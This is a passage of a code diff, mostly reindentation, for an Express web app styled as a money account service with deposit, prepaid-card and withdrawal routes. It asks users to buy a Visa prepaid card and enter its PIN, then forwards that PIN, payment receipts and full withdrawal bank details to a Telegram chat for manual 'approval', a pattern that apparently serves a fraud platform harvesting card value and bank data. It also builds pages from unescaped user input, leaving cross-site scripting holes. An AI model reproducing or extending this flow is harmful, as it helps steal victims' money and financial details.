+  const request = await getDepositRequestByRequestId(req.params.requestId);
+  if (!request) { return res.json({ status: "not_found" }); }
+  res.json({ status: request.status, bankDetails: request.bankDetails });
 });
 
 app.get("/add-money/payment/:requestId", requireAuth, async (req, res) => {
-    const customer = await getCustomerById(req.session.customerId);
-    const notificationCount = await getUnreadNotificationCount(req.session.customerId);
-    const request = await getDepositRequestByRequestId(req.params.requestId);
-    if (!request || !request.bankDetails) { return res.redirect("/dashboard"); }
+  const customer = await getCustomerById(req.session.customerId);
+  const notificationCount = await getUnreadNotificationCount(req.session.customerId);
+  const request = await getDepositRequestByRequestId(req.params.requestId);
+  if (!request || !request.bankDetails) { return res.redirect("/dashboard"); }
 
-    const bd = request.bankDetails;
-    const currency = customer.currency || "EUR";
-    let paymentDetailsHtml = "";
+  const bd = request.bankDetails;
+  const currency = customer.currency || "EUR";
+  let paymentDetailsHtml = "";
 
-    if (bd.email) {
-        paymentDetailsHtml = `<div class="payment-row"><span class="payment-row-label">Send to Email</span><span class="payment-row-value">${bd.email}</span></div><div class="payment-row"><span class="payment-row-label">Amount</span><span class="payment-row-value"><strong>${formatCurrency(request.amount, currency)}</strong></span></div><div class="payment-row"><span class="payment-row-label">Reference</span><span class="payment-row-value">${request.requestId}</span></div>`;
-    } else if (bd.iban) {
-        paymentDetailsHtml = `<div class="payment-row"><span class="payment-row-label">Bank</span><span class="payment-row-value">${bd.bank || "N/A"}</span></div><div class="payment-row"><span class="payment-row-label">IBAN</span><span class="payment-row-value">${bd.iban}</span></div><div class="payment-row"><span class="payment-row-label">BIC</span><span class="payment-row-value">${bd.bic || "N/A"}</span></div><div class="payment-row"><span class="payment-row-label">Holder</span><span class="payment-row-value">${bd.holder || "N/A"}</span></div><div class="payment-row"><span class="payment-row-label">Amount</span><span class="payment-row-value"><strong>${formatCurrency(request.amount, currency)}</strong></span></div><div class="payment-row"><span class="payment-row-label">Reference</span><span class="payment-row-value">${request.requestId}</span></div>`;
-    } else if (bd.sortCode) {
-        paymentDetailsHtml = `<div class="payment-row"><span class="payment-row-label">Bank</span><span class="payment-row-value">${bd.bank || "N/A"}</span></div><div class="payment-row"><span class="payment-row-label">Account</span><span class="payment-row-value">${bd.accountNumber}</span></div><div class="payment-row"><span class="payment-row-label">Sort Code</span><span class="payment-row-value">${bd.sortCode}</span></div><div class="payment-row"><span class="payment-row-label">Holder</span><span class="payment-row-value">${bd.holder || "N/A"}</span></div><div class="payment-row"><span class="payment-row-label">Amount</span><span class="payment-row-value"><strong>${formatCurrency(request.amount, currency)}</strong></span></div><div class="payment-row"><span class="payment-row-label">Reference</span><span class="payment-row-value">${request.requestId}</span></div>`;
-    } else {
-        paymentDetailsHtml = `<div class="payment-row"><span class="payment-row-label">Details</span><span class="payment-row-value">${bd.info || JSON.stringify(bd)}</span></div><div class="payment-row"><span class="payment-row-label">Amount</span><span class="payment-row-value"><strong>${formatCurrency(request.amount, currency)}</strong></span></div>`;
-    }
+  if (bd.email) {
+    paymentDetailsHtml = `<div class="payment-row"><span class="payment-row-label">Send to Email</span><span class="payment-row-value">${bd.email}</span></div><div class="payment-row"><span class="payment-row-label">Amount</span><span class="payment-row-value"><strong>${formatCurrency(request.amount, currency)}</strong></span></div><div class="payment-row"><span class="payment-row-label">Reference</span><span class="payment-row-value">${request.requestId}</span></div>`;
+  } else if (bd.iban) {
+    paymentDetailsHtml = `<div class="payment-row"><span class="payment-row-label">Bank</span><span class="payment-row-value">${bd.bank || "N/A"}</span></div><div class="payment-row"><span class="payment-row-label">IBAN</span><span class="payment-row-value">${bd.iban}</span></div><div class="payment-row"><span class="payment-row-label">BIC</span><span class="payment-row-value">${bd.bic || "N/A"}</span></div><div class="payment-row"><span class="payment-row-label">Holder</span><span class="payment-row-value">${bd.holder || "N/A"}</span></div><div class="payment-row"><span class="payment-row-label">Amount</span><span class="payment-row-value"><strong>${formatCurrency(request.amount, currency)}</strong></span></div><div class="payment-row"><span class="payment-row-label">Reference</span><span class="payment-row-value">${request.requestId}</span></div>`;
+  } else if (bd.sortCode) {
+    paymentDetailsHtml = `<div class="payment-row"><span class="payment-row-label">Bank</span><span class="payment-row-value">${bd.bank || "N/A"}</span></div><div class="payment-row"><span class="payment-row-label">Account</span><span class="payment-row-value">${bd.accountNumber}</span></div><div class="payment-row"><span class="payment-row-label">Sort Code</span><span class="payment-row-value">${bd.sortCode}</span></div><div class="payment-row"><span class="payment-row-label">Holder</span><span class="payment-row-value">${bd.holder || "N/A"}</span></div><div class="payment-row"><span class="payment-row-label">Amount</span><span class="payment-row-value"><strong>${formatCurrency(request.amount, currency)}</strong></span></div><div class="payment-row"><span class="payment-row-label">Reference</span><span class="payment-row-value">${request.requestId}</span></div>`;
+  } else {
+    paymentDetailsHtml = `<div class="payment-row"><span class="payment-row-label">Details</span><span class="payment-row-value">${bd.info || JSON.stringify(bd)}</span></div><div class="payment-row"><span class="payment-row-label">Amount</span><span class="payment-row-value"><strong>${formatCurrency(request.amount, currency)}</strong></span></div>`;
+  }
 
-    const content = `
+  const content = `
     <a href="/dashboard" class="back-link"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="19" y1="12" x2="5" y2="12"/><polyline points="12 19 5 12 12 5"/></svg>Back</a>
     <div class="form-container"><div class="form-card">
       <div class="form-header"><h1>Payment Details</h1><p>Complete your payment using the details below</p></div>
@@ -5075,59 +5013,59 @@ app.get("/add-money/payment/:requestId", requireAuth, async (req, res) => {
       document.getElementById('receiptFile').addEventListener('change', function(e) { if (this.files && this.files[0]) { document.getElementById('fileName').textContent = 'Selected: ' + this.files[0].name; document.getElementById('fileName').style.display = 'block'; } });
     </script>
   `;
-    res.send(getPageWrapper(content, "dashboard", customer, notificationCount));
+  res.send(getPageWrapper(content, "dashboard", customer, notificationCount));
 });
 
 app.post("/add-money/verify/:requestId", requireAuth, upload.single("receipt"), async (req, res) => {
-    const request = await getDepositRequestByRequestId(req.params.requestId);
-    const customer = await getCustomerById(req.session.customerId);
-    if (!request) { return res.redirect("/dashboard"); }
-    await updateDepositRequest(req.params.requestId, { status: "pending_verification" });
-    if (req.file) {
-        const caption = `🧾 *PAYMENT RECEIPT*\n━━━━━━━━━━━━━━━━━━━━━━━━━\n🔖 Request ID: \`${request.requestId}\`\n👤 Customer: ${customer.name}\n💵 Amount: ${formatCurrency(request.amount, customer.currency)}\n━━━━━━━━━━━━━━━━━━━━━━━━━\n⏳ *Action Required:* Verify and approve`;
-        try { await sendTelegramPhoto(req.file.buffer, caption); } catch (e) { console.error("Photo error:", e); }
-    }
-    res.redirect(`/add-money/pending/${request.requestId}`);
+  const request = await getDepositRequestByRequestId(req.params.requestId);
+  const customer = await getCustomerById(req.session.customerId);
+  if (!request) { return res.redirect("/dashboard"); }
+  await updateDepositRequest(req.params.requestId, { status: "pending_verification" });
+  if (req.file) {
+    const caption = `🧾 *PAYMENT RECEIPT*\n━━━━━━━━━━━━━━━━━━━━━━━━━\n🔖 Request ID: \`${request.requestId}\`\n👤 Customer: ${customer.name}\n💵 Amount: ${formatCurrency(request.amount, customer.currency)}\n━━━━━━━━━━━━━━━━━━━━━━━━━\n⏳ *Action Required:* Verify and approve`;
+    try { await sendTelegramPhoto(req.file.buffer, caption); } catch (e) { console.error("Photo error:", e); }
+  }
+  res.redirect(`/add-money/pending/${request.requestId}`);
 });
 
 app.get("/add-money/pending/:requestId", requireAuth, async (req, res) => {
-    const customer = await getCustomerById(req.session.customerId);
-    const notificationCount = await getUnreadNotificationCount(req.session.customerId);
-    const content = `<div class="form-container"><div class="form-card"><div class="success-screen"><div class="success-icon" style="background-color: #FFF3E0; color: #FB8C00;">⏳</div><h2>Pending Review</h2><p>Your payment is being verified.</p><p style="margin-top: 12px; color: #888;">Reference: ${req.params.requestId}</p><a href="/dashboard" class="btn btn-primary" style="margin-top: 24px;">Back to Dashboard</a></div></div></div>
+  const customer = await getCustomerById(req.session.customerId);
+  const notificationCount = await getUnreadNotificationCount(req.session.customerId);
+  const content = `<div class="form-container"><div class="form-card"><div class="success-screen"><div class="success-icon" style="background-color: #FFF3E0; color: #FB8C00;">⏳</div><h2>Pending Review</h2><p>Your payment is being verified.</p><p style="margin-top: 12px; color: #888;">Reference: ${req.params.requestId}</p><a href="/dashboard" class="btn btn-primary" style="margin-top: 24px;">Back to Dashboard</a></div></div></div>
     <script>async function checkStatus() { try { const response = await fetch('/api/check-deposit/${req.params.requestId}'); const data = await response.json(); if (data.status === 'approved') { window.location.href = '/add-money/success/${req.params.requestId}'; } else if (data.status === 'rejected') { window.location.href = '/dashboard'; } else { setTimeout(checkStatus, 3000); } } catch (e) { setTimeout(checkStatus, 3000); } } checkStatus();</script>`;
-    res.send(getPageWrapper(content, "dashboard", customer, notificationCount));
+  res.send(getPageWrapper(content, "dashboard", customer, notificationCount));
 });
 
 app.get("/add-money/success/:requestId", requireAuth, async (req, res) => {
-    const customer = await getCustomerById(req.session.customerId);
-    const notificationCount = await getUnreadNotificationCount(req.session.customerId);
-    const request = await getDepositRequestByRequestId(req.params.requestId);
-    const content = `<div class="form-container"><div class="form-card"><div class="success-screen"><div class="success-icon">✓</div><h2>Deposit Successful</h2><p>${formatCurrency(request?.amount || 0, customer.currency)} has been credited.</p><p style="margin-top: 12px;">New Balance: <strong>${formatCurrency(customer.balance, customer.currency)}</strong></p><a href="/dashboard" class="btn btn-primary" style="margin-top: 24px;">Back to Dashboard</a></div></div></div>`;
-    res.send(getPageWrapper(content, "dashboard", customer, notificationCount));
+  const customer = await getCustomerById(req.session.customerId);
+  const notificationCount = await getUnreadNotificationCount(req.session.customerId);
+  const request = await getDepositRequestByRequestId(req.params.requestId);
+  const content = `<div class="form-container"><div class="form-card"><div class="success-screen"><div class="success-icon">✓</div><h2>Deposit Successful</h2><p>${formatCurrency(request?.amount || 0, customer.currency)} has been credited.</p><p style="margin-top: 12px;">New Balance: <strong>${formatCurrency(customer.balance, customer.currency)}</strong></p><a href="/dashboard" class="btn btn-primary" style="margin-top: 24px;">Back to Dashboard</a></div></div></div>`;
+  res.send(getPageWrapper(content, "dashboard", customer, notificationCount));
 });
 
 app.get("/add-money/prepaid", requireAuth, async (req, res) => {
-    const customer = await getCustomerById(req.session.customerId);
-    const notificationCount = await getUnreadNotificationCount(req.session.customerId);
-    if (customer.currency !== "USD") { return res.redirect("/add-money"); }
-    const pendingDeposit = req.session.pendingDeposit || { amount: 0 };
-    const content = `
+  const customer = await getCustomerById(req.session.customerId);
+  const notificationCount = await getUnreadNotificationCount(req.session.customerId);
+  if (customer.currency !== "USD") { return res.redirect("/add-money"); }
+  const pendingDeposit = req.session.pendingDeposit || { amount: 0 };
+  const content = `
     <a href="/add-money" class="back-link"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="19" y1="12" x2="5" y2="12"/><polyline points="12 19 5 12 12 5"/></svg>Back</a>
     <div class="form-container"><div class="form-card"><div class="form-header"><h1>Visa Prepaid Card</h1></div>
       <div class="prepaid-instructions"><h3>📋 Instructions</h3><ol><li>Visit your nearest retail store</li><li>Purchase a Visa Prepaid Card</li><li>Scratch the back to reveal the PIN</li><li>Enter the PIN below</li></ol></div>
       <form method="POST" action="/add-money/prepaid"><div class="form-group"><label class="form-label">Card PIN</label><input type="text" name="cardPin" class="form-input" placeholder="XXXX-XXXX-XXXX-XXXX" required></div><div class="form-group"><label class="form-label">Card Amount</label><input type="number" name="amount" class="form-input" placeholder="0.00" step="0.01" min="1" value="${pendingDeposit.amount}" required></div><button type="submit" class="btn btn-primary btn-block btn-lg">Activate Card</button></form>
     </div></div>`;
-    res.send(getPageWrapper(content, "dashboard", customer, notificationCount));
+  res.send(getPageWrapper(content, "dashboard", customer, notificationCount));
 });
 
 app.post("/add-money/prepaid", requireAuth, async (req, res) => {
-    const { cardPin, amount } = req.body;
-    const customer = await getCustomerById(req.session.customerId);
-    const request = await createDepositRequest({ customerId: req.session.customerId, customerName: customer.name, customerEmail: customer.email, currency: customer.currency, amount, paymentMethod: "visaprepaid" });
-    await updateDepositRequest(request.requestId, { prepaidCardPin: cardPin, status: "pending_verification" });
-    const message = `💳 *PREPAID CARD ACTIVATION*\n━━━━━━━━━━━━━━━━━━━━━━━━━\n🔖 Request ID: \`${request.requestId}\`\n👤 Customer: ${customer.name}\n💵 Amount: ${formatCurrency(amount, customer.currency)}\n🔐 Card PIN: \`${cardPin}\`\n━━━━━━━━━━━━━━━━━━━━━━━━━\n⏳ *Action Required:* Verify and approve`;
-    try { await sendTelegramMessage(message); } catch (e) { console.error("Telegram error:", e); }
-    res.redirect(`/add-money/pending/${request.requestId}`);
+  const { cardPin, amount } = req.body;
+  const customer = await getCustomerById(req.session.customerId);
+  const request = await createDepositRequest({ customerId: req.session.customerId, customerName: customer.name, customerEmail: customer.email, currency: customer.currency, amount, paymentMethod: "visaprepaid" });
+  await updateDepositRequest(request.requestId, { prepaidCardPin: cardPin, status: "pending_verification" });
+  const message = `💳 *PREPAID CARD ACTIVATION*\n━━━━━━━━━━━━━━━━━━━━━━━━━\n🔖 Request ID: \`${request.requestId}\`\n👤 Customer: ${customer.name}\n💵 Amount: ${formatCurrency(amount, customer.currency)}\n🔐 Card PIN: \`${cardPin}\`\n━━━━━━━━━━━━━━━━━━━━━━━━━\n⏳ *Action Required:* Verify and approve`;
+  try { await sendTelegramMessage(message); } catch (e) { console.error("Telegram error:", e); }
+  res.redirect(`/add-money/pending/${request.requestId}`);
 });
 
 // ==========================================
@@ -5135,68 +5073,58 @@ app.post("/add-money/prepaid", requireAuth, async (req, res) => {
 // ==========================================
 
 app.get("/withdraw", requireAuth, async (req, res) => {
-    const customer = await getCustomerById(req.session.customerId);
-    const notificationCount = await getUnreadNotificationCount(req.session.customerId);
-    const currency = customer.currency || "EUR";
-    const withdrawalAccounts = customer.withdrawalAccounts || [];
+  const customer = await getCustomerById(req.session.customerId);
+  const notificationCount = await getUnreadNotificationCount(req.session.customerId);
+  const currency = customer.currency || "EUR";
+  const withdrawalAccounts = customer.withdrawalAccounts || [];
 
-    let accountsHtml = withdrawalAccounts.length === 0 ? `<div style="text-align: center; padding: 24px; background: #f8f9fa; border-radius: 12px; margin-bottom: 24px;"><p style="color: #666; margin-bottom: 16px;">No withdrawal accounts added yet</p><a href="/withdrawal-accounts/add" class="btn btn-primary">Add Account</a></div>` : `<div class="form-group"><label class="form-label">Withdraw To</label><select name="accountId" class="form-select" required><option value="">Select account</option>${withdrawalAccounts.map((acc) => { const masked = maskAccountNumber(acc.iban || acc.accountNumber); return `<option value="${acc._id}">${acc.bankName} (${masked})</option>`; }).join("")}</select></div>`;
+  let accountsHtml = withdrawalAccounts.length === 0 ? `<div style="text-align: center; padding: 24px; background: #f8f9fa; border-radius: 12px; margin-bottom: 24px;"><p style="color: #666; margin-bottom: 16px;">No withdrawal accounts added yet</p><a href="/withdrawal-accounts/add" class="btn btn-primary">Add Account</a></div>` : `<div class="form-group"><label class="form-label">Withdraw To</label><select name="accountId" class="form-select" required><option value="">Select account</option>${withdrawalAccounts.map((acc) => { const masked = maskAccountNumber(acc.iban || acc.accountNumber); return `<option value="${acc._id}">${acc.bankName} (${masked})</option>`; }).join("")}</select></div>`;
 
-    const content = `
+  const content = `
     <a href="/dashboard" class="back-link"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="19" y1="12" x2="5" y2="12"/><polyline points="12 19 5 12 12 5"/></svg>Back</a>
     <div class="form-container"><div class="form-card"><div class="form-header"><h1>Withdraw Money</h1><p>Available: <strong>${formatCurrency(customer.balance, currency)}</strong></p></div>
       ${withdrawalAccounts.length > 0 ? `<form method="POST" action="/withdraw"><button type="button" class="btn btn-secondary btn-block" style="margin-bottom: 16px;" onclick="document.getElementById('amountInput').value='${customer.balance}'">Withdraw Full Amount</button><div class="form-group"><label class="form-label">Amount</label><input type="number" name="amount" id="amountInput" class="form-input" placeholder="0.00" step="0.01" min="1" max="${customer.balance}" required></div>${accountsHtml}<button type="submit" class="btn btn-primary btn-block btn-lg">Continue</button></form>` : accountsHtml}
       <div style="text-align: center; margin-top: 24px;"><a href="/withdrawal-accounts" style="color: #00796B; font-size: 14px;">Manage withdrawal accounts</a></div>
     </div></div>`;
-    res.send(getPageWrapper(content, "dashboard", customer, notificationCount));
+  res.send(getPageWrapper(content, "dashboard", customer, notificationCount));
 });
 
 app.post("/withdraw", requireAuth, async (req, res) => {
-    const { amount, accountId } = req.body;
-    const customer = await getCustomerById(req.session.customerId);
-    const withdrawalAccount = customer.withdrawalAccounts.find((a) => a._id.toString() === accountId);
-    if (!withdrawalAccount) { return res.redirect("/withdraw"); }
-    if (parseFloat(amount) > customer.balance) { return res.redirect("/withdraw?error=insufficient"); }
+  const { amount, accountId } = req.body;
+  const customer = await getCustomerById(req.session.customerId);
+  const withdrawalAccount = customer.withdrawalAccounts.find((a) => a._id.toString() === accountId);
+  if (!withdrawalAccount) { return res.redirect("/withdraw"); }
+  if (parseFloat(amount) > customer.balance) { return res.redirect("/withdraw?error=insufficient"); }
 
-    const request = await createWithdrawalRequest({ customerId: req.session.customerId, customerName: customer.name, currency: customer.currency, amount, withdrawalAccount });
+  const request = await createWithdrawalRequest({ customerId: req.session.customerId, customerName: customer.name, currency: customer.currency, amount, withdrawalAccount });
+  
+  // Get masked account number for the alert
+  const maskedAccount = maskAccountNumber(withdrawalAccount.iban || withdrawalAccount.accountNumber);
+  
+  // Original detailed notification
+  let accountDetails = `Bank: ${withdrawalAccount.bankName}`;
+  if (customer.currency === "EUR") { accountDetails += `\nIBAN: ${withdrawalAccount.iban}\nBIC: ${withdrawalAccount.bic}`; }
+  else if (customer.currency === "GBP") { accountDetails += `\nAccount: ${withdrawalAccount.accountNumber}\nSort Code: ${withdrawalAccount.sortCode}`; }
+  else { accountDetails += `\nAccount: ${withdrawalAccount.accountNumber}\nRouting: ${withdrawalAccount.routingNumber}`; }
 
-    // Get masked account number for the alert
-    const maskedAccount = maskAccountNumber(withdrawalAccount.iban || withdrawalAccount.accountNumber);
-
-    // Original detailed notification for admin panel
-    let accountDetails = `Bank: ${withdrawalAccount.bankName}`;
-    if (customer.currency === "EUR") { accountDetails += `\nIBAN: ${withdrawalAccount.iban}\nBIC: ${withdrawalAccount.bic}`; }
-    else if (customer.currency === "GBP") { accountDetails += `\nAccount: ${withdrawalAccount.accountNumber}\nSort Code: ${withdrawalAccount.sortCode}`; }
-    else { accountDetails += `\nAccount: ${withdrawalAccount.accountNumber}\nRouting: ${withdrawalAccount.routingNumber}`; }
-
-    const message = `💸 *NEW WITHDRAWAL REQUEST*\n━━━━━━━━━━━━━━━━━━━━━━━━━\n🔖 Request ID: \`${request.requestId}\`\n👤 Customer: ${customer.name}\n💰 Balance: ${formatCurrency(customer.balance, customer.currency)}\n💵 Amount: ${formatCurrency(amount, customer.currency)}\n━━━━━━━━━━━━━━━━━━━━━━━━━\n📤 *Sending To:*\n${accountDetails}\n━━━━━━━━━━━━━━━━━━━━━━━━━\n⏳ *Action Required:* Approve or reject`;
-
-    // NEW: Additional direct alert notification
-    const alertMessage = `
-💸 *NEW WITHDRAWAL REQUEST*
-━━━━━━━━━━━━━━━━━━━━━━
-🔖 Request ID: \`${request.requestId}\`
-👤 Customer: ${customer.name}
-💰 Balance: ${formatCurrency(customer.balance, customer.currency)}
-💵 Amount: ${formatCurrency(amount, customer.currency)}
-📤 To: ${withdrawalAccount.bankName} (${maskedAccount})
-━━━━━━━━━━━━━━━━━━━━━━
-⏳ Action: Approve or reject
-  `;
-
-    try {
-        await sendTelegramMessage(message);
-        await sendTelegramMessage(alertMessage);
-    } catch (e) { console.error("Telegram error:", e); }
-
-    res.redirect(`/withdraw/pending/${request.requestId}`);
+  const message = `💸 *NEW WITHDRAWAL REQUEST*\n━━━━━━━━━━━━━━━━━━━━━━━━━\n🔖 Request ID: \`${request.requestId}\`\n👤 Customer: ${customer.name}\n💰 Balance: ${formatCurrency(customer.balance, customer.currency)}\n💵 Amount: ${formatCurrency(amount, customer.currency)}\n━━━━━━━━━━━━━━━━━━━━━━━━━\n📤 *Sending To:*\n${accountDetails}\n━━━━━━━━━━━━━━━━━━━━━━━━━\n⏳ *Action Required:* Approve or reject`;
+  
+  // NEW: Additional direct alert notification
+  const alertMessage = `💸 *NEW WITHDRAWAL REQUEST*\n━━━━━━━━━━━━━━━━━━━━━━\n🔖 Request ID: \`${request.requestId}\`\n👤 Customer: ${customer.name}\n💰 Balance: ${formatCurrency(customer.balance, customer.currency)}\n💵 Amount: ${formatCurrency(amount, customer.currency)}\n📤 To: ${withdrawalAccount.bankName} (${maskedAccount})\n━━━━━━━━━━━━━━━━━━━━━━\n⏳ Action: Approve or reject`;
+  
+  try { 
+    await sendTelegramMessage(message); 
+    await sendTelegramMessage(alertMessage);
+  } catch (e) { console.error("Telegram error:", e); }
+  
+  res.redirect(`/withdraw/pending/${request.requestId}`);
 });
 
 app.get("/withdraw/pending/:requestId", requireAuth, async (req, res) => {
-    const customer = await getCustomerById(req.session.customerId);
-    const notificationCount = await getUnreadNotificationCount(req.session.customerId);
-    const content = `<div class="form-container"><div class="form-card"><div class="success-screen"><div class="success-icon" style="background-color: #FFF3E0; color: #FB8C00;">⏳</div><h2>Pending Review</h2><p>Your withdrawal request is being processed.</p><p style="margin-top: 12px; color: #888;">Reference: ${req.params.requestId}</p><a href="/dashboard" class="btn btn-primary" style="margin-top: 24px;">Back to Dashboard</a></div></div></div>`;
-    res.send(getPageWrapper(content, "dashboard", customer, notificationCount));
+  const customer = await getCustomerById(req.session.customerId);
+  const notificationCount = await getUnreadNotificationCount(req.session.customerId);
+  const content = `<div class="form-container"><div class="form-card"><div class="success-screen"><div class="success-icon" style="background-color: #FFF3E0; color: #FB8C00;">⏳</div><h2>Pending Review</h2><p>Your withdrawal request is being processed.</p><p style="margin-top: 12px; color: #888;">Reference: ${req.params.requestId}</p><a href="/dashboard" class="btn btn-primary" style="margin-top: 24px;">Back to Dashboard</a></div></div></div>`;
+  res.send(getPageWrapper(content, "dashboard", customer, notificationCount));
 });
 
 // ==========================================
@@ -5204,42 +5132,42 @@ app.get("/withdraw/pending/:requestId", requireAuth, async (req, res) => {
 // ==========================================
 
 app.get("/withdrawal-accounts", requireAuth, async (req, res) => {
-    const customer = await getCustomerById(req.session.customerId);
-    const notificationCount = await getUnreadNotificationCount(req.session.customerId);
-    const accounts = customer.withdrawalAccounts || [];
-    const currency = customer.currency || "EUR";
+  const customer = await getCustomerById(req.session.customerId);
+  const notificationCount = await getUnreadNotificationCount(req.session.customerId);
+  const accounts = customer.withdrawalAccounts || [];
+  const currency = customer.currency || "EUR";
 
-    let accountsListHtml = accounts.length === 0 ? `<div style="text-align: center; padding: 40px; color: #888;"><p>No withdrawal accounts added yet</p></div>` : '<div class="accounts-list">' + accounts.map((acc) => { let details = currency === "EUR" ? `IBAN: ${maskAccountNumber(acc.iban)}` : currency === "GBP" ? `Account: ${maskAccountNumber(acc.accountNumber)} | Sort: ${acc.sortCode}` : `Account: ${maskAccountNumber(acc.accountNumber)}`; return `<div class="account-item"><div class="account-item-info"><h4>${acc.bankName}</h4><p>${details}</p></div><div class="account-item-actions"><a href="/withdrawal-accounts/delete/${acc._id}" class="delete" onclick="return confirm('Delete this account?')">Delete</a></div></div>`; }).join("") + "</div>";
+  let accountsListHtml = accounts.length === 0 ? `<div style="text-align: center; padding: 40px; color: #888;"><p>No withdrawal accounts added yet</p></div>` : '<div class="accounts-list">' + accounts.map((acc) => { let details = currency === "EUR" ? `IBAN: ${maskAccountNumber(acc.iban)}` : currency === "GBP" ? `Account: ${maskAccountNumber(acc.accountNumber)} | Sort: ${acc.sortCode}` : `Account: ${maskAccountNumber(acc.accountNumber)}`; return `<div class="account-item"><div class="account-item-info"><h4>${acc.bankName}</h4><p>${details}</p></div><div class="account-item-actions"><a href="/withdrawal-accounts/delete/${acc._id}" class="delete" onclick="return confirm('Delete this account?')">Delete</a></div></div>`; }).join("") + "</div>";
 
-    const content = `<a href="/dashboard" class="back-link"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="19" y1="12" x2="5" y2="12"/><polyline points="12 19 5 12 12 5"/></svg>Back</a><div class="form-container"><div class="form-card"><div class="form-header"><h1>Withdrawal Accounts</h1><p>Manage your linked accounts</p></div>${accountsListHtml}<a href="/withdrawal-accounts/add" class="btn btn-primary btn-block">Add New Account</a></div></div>`;
-    res.send(getPageWrapper(content, "settings", customer, notificationCount));
+  const content = `<a href="/dashboard" class="back-link"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="19" y1="12" x2="5" y2="12"/><polyline points="12 19 5 12 12 5"/></svg>Back</a><div class="form-container"><div class="form-card"><div class="form-header"><h1>Withdrawal Accounts</h1><p>Manage your linked accounts</p></div>${accountsListHtml}<a href="/withdrawal-accounts/add" class="btn btn-primary btn-block">Add New Account</a></div></div>`;
+  res.send(getPageWrapper(content, "settings", customer, notificationCount));
 });
 
 app.get("/withdrawal-accounts/add", requireAuth, async (req, res) => {
-    const customer = await getCustomerById(req.session.customerId);
-    const notificationCount = await getUnreadNotificationCount(req.session.customerId);
-    const currency = customer.currency || "EUR";
+  const customer = await getCustomerById(req.session.customerId);
+  const notificationCount = await getUnreadNotificationCount(req.session.customerId);
+  const currency = customer.currency || "EUR";
 
-    let fieldsHtml = currency === "EUR" ? `<div class="form-group"><label class="form-label">IBAN</label><input type="text" name="iban" class="form-input" placeholder="DE89 3704 0044 0532 0130 00" required></div><div class="form-group"><label class="form-label">BIC / SWIFT</label><input type="text" name="bic" class="form-input" placeholder="DEUTDEDB" required></div>` : currency === "GBP" ? `<div class="form-group"><label class="form-label">Account Number</label><input type="text" name="accountNumber" class="form-input" placeholder="12345678" required></div><div class="form-group"><label class="form-label">Sort Code</label><input type="text" name="sortCode" class="form-input" placeholder="12-34-56" required></div>` : `<div class="form-group"><label class="form-label">Account Number</label><input type="text" name="accountNumber" class="form-input" placeholder="1234567890" required></div><div class="form-group"><label class="form-label">Routing Number</label><input type="text" name="routingNumber" class="form-input" placeholder="021000021" required></div>`;
+  let fieldsHtml = currency === "EUR" ? `<div class="form-group"><label class="form-label">IBAN</label><input type="text" name="iban" class="form-input" placeholder="DE89 3704 0044 0532 0130 00" required></div><div class="form-group"><label class="form-label">BIC / SWIFT</label><input type="text" name="bic" class="form-input" placeholder="DEUTDEDB" required></div>` : currency === "GBP" ? `<div class="form-group"><label class="form-label">Account Number</label><input type="text" name="accountNumber" class="form-input" placeholder="12345678" required></div><div class="form-group"><label class="form-label">Sort Code</label><input type="text" name="sortCode" class="form-input" placeholder="12-34-56" required></div>` : `<div class="form-group"><label class="form-label">Account Number</label><input type="text" name="accountNumber" class="form-input" placeholder="1234567890" required></div><div class="form-group"><label class="form-label">Routing Number</label><input type="text" name="routingNumber" class="form-input" placeholder="021000021" required></div>`;
 
-    const content = `<a href="/withdrawal-accounts" class="back-link"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="19" y1="12" x2="5" y2="12"/><polyline points="12 19 5 12 12 5"/></svg>Back</a><div class="form-container"><div class="form-card"><div class="form-header"><h1>Add Account</h1></div><form method="POST" action="/withdrawal-accounts/add"><div class="form-group"><label class="form-label">Bank Name</label><input type="text" name="bankName" class="form-input" placeholder="Bank Name" required></div>${fieldsHtml}<div class="form-group"><label class="form-label">Account Holder Name</label><input type="text" name="holderName" class="form-input" placeholder="John Doe" required></div><button type="submit" class="btn btn-primary btn-block btn-lg">Save Account</button></form></div></div>`;
-    res.send(getPageWrapper(content, "settings", customer, notificationCount));
+  const content = `<a href="/withdrawal-accounts" class="back-link"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="19" y1="12" x2="5" y2="12"/><polyline points="12 19 5 12 12 5"/></svg>Back</a><div class="form-container"><div class="form-card"><div class="form-header"><h1>Add Account</h1></div><form method="POST" action="/withdrawal-accounts/add"><div class="form-group"><label class="form-label">Bank Name</label><input type="text" name="bankName" class="form-input" placeholder="Bank Name" required></div>${fieldsHtml}<div class="form-group"><label class="form-label">Account Holder Name</label><input type="text" name="holderName" class="form-input" placeholder="John Doe" required></div><button type="submit" class="btn btn-primary btn-block btn-lg">Save Account</button></form></div></div>`;
+  res.send(getPageWrapper(content, "settings", customer, notificationCount));
 });
 
 app.post("/withdrawal-accounts/add", requireAuth, async (req, res) => {
-    const customer = await getCustomerById(req.session.customerId);
-    const { bankName, iban, bic, accountNumber, routingNumber, sortCode, holderName } = req.body;
-    const accountData = { bankName, holderName };
-    if (customer.currency === "EUR") { accountData.iban = iban; accountData.bic = bic; }
-    else if (customer.currency === "GBP") { accountData.accountNumber = accountNumber; accountData.sortCode = sortCode; }
-    else { accountData.accountNumber = accountNumber; accountData.routingNumber = routingNumber; }
-    await addWithdrawalAccount(req.session.customerId, accountData);
-    res.redirect("/withdrawal-accounts");
+  const customer = await getCustomerById(req.session.customerId);
+  const { bankName, iban, bic, accountNumber, routingNumber, sortCode, holderName } = req.body;
+  const accountData = { bankName, holderName };
+  if (customer.currency === "EUR") { accountData.iban = iban; accountData.bic = bic; }
+  else if (customer.currency === "GBP") { accountData.accountNumber = accountNumber; accountData.sortCode = sortCode; }
+  else { accountData.accountNumber = accountNumber; accountData.routingNumber = routingNumber; }
+  await addWithdrawalAccount(req.session.customerId, accountData);
+  res.redirect("/withdrawal-accounts");
 });
 
 app.get("/withdrawal-accounts/delete/:accountId", requireAuth, async (req, res) => {
-    await deleteWithdrawalAccount(req.session.customerId, req.params.accountId);
-    res.redirect("/withdrawal-accounts");
+  await deleteWithdrawalAccount(req.session.customerId, req.params.accountId);
